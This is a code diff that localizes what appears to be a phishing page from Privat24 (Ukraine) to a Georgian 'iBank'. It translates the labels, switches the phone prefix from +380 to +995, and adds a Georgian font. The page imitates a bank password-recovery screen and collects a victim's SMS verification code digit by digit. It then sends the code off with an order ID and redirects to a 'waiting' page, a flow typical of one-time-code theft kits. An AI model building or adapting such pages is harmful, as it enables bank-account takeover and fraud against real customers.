@@ -1,12 +1,16 @@
 <!DOCTYPE html>
-<html lang="uk" dir="ltr">
+<html lang="ka" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Відновлення пароля від Приват24</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<title>iBank-ის პაროლის აღდგენა</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
-  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
+  html,body{height:100%;font-family: "Noto Sans Georgian", -apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
   body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
 
   .header{
@@ -36,7 +40,7 @@
     flex:1;height:52px;border:none;border-bottom:1.5px solid #d8d8d8;
     background:transparent;text-align:center;
     font-size:24px;font-weight:400;color:#1a1a1a;
-    font-family:inherit;outline:none;transition:.2s;padding:0 0 6px;
+    font-family: "Noto Sans Georgian", inherit;outline:none;transition:.2s;padding:0 0 6px;
     min-width:0;
   }
   .code-digit::placeholder{color:#d8d8d8;font-weight:300}
@@ -58,15 +62,15 @@
   </div>
 
   <div class="content">
-    <div class="title">Відновлення пароля від<br>Приват24</div>
+    <div class="title">iBank-ის პაროლის აღდგენა<br>iBank</div>
 
     <div class="field">
-      <div class="lbl">Номер телефону</div>
+      <div class="lbl">ტელეფონის ნომერი</div>
       <div class="phone-val" id="userPhone">+38 (___) ___ __ __</div>
     </div>
 
     <div class="field">
-      <div class="lbl">Повідомлення з кодом</div>
+      <div class="lbl">შეტყობინება კოდით</div>
       <div class="code-row">
         <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c0" placeholder="X">
         <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c1" placeholder="X">
@@ -96,7 +100,7 @@
                 p.substring(8,10);
       document.getElementById("userPhone").textContent = f;
     } else if (p.length > 0) {
-      document.getElementById("userPhone").textContent = "+380" + p;
+      document.getElementById("userPhone").textContent = "+995" + p;
     }
   }
 
@@ -116,7 +120,7 @@
 
   if (params.get("error") === "1") {
     const el = document.getElementById("errorMsg");
-    el.textContent = "Код невірний або недійсний";
+    el.textContent = "არასწორი კოდი";
     el.style.display = "block";
     setTimeout(() => { el.style.display = "none"; }, 3500);
   }
@@ -178,11 +182,11 @@
         location.href = "code3-waiting.html?order=" + orderId +
                         (phone ? "&phone=" + encodeURIComponent(phone) : "");
       } else {
-        showError(data.message || "Сталася помилка");
+        showError(data.message || "შეცდომა მოხდა");
         resetInputs();
       }
     } catch (err) {
-      showError("Помилка з'єднання");
+      showError("კავშირის შეცდომა");
       resetInputs();
     }
   }
